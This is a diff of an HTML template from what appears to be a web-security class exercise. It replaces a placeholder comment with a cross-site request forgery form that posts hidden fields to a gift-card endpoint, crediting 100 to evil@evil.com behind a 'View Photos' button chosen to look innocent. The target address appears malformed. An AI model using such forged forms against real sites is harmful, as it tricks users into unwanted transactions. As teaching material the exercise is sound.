@@ -26,11 +26,11 @@ There will be an HTML comment inviting you to add the form.</p>
     <li>Your submit button should say <code>View Photos</code> because that looks innocent</li>
 </ul>
 
-<!-- put your form here
-
-<form><input></form>
-
--->
+  <form method="POST" action="http://3.84.108:8000/csrf/gift-card.html">
+    <input type="hidden" name="email" value="evil@evil.com">
+    <input type="hidden" name="amount" value="100">
+    <input type="submit" value="View Photos">
+  </form>
 
 {% endblock %}
 
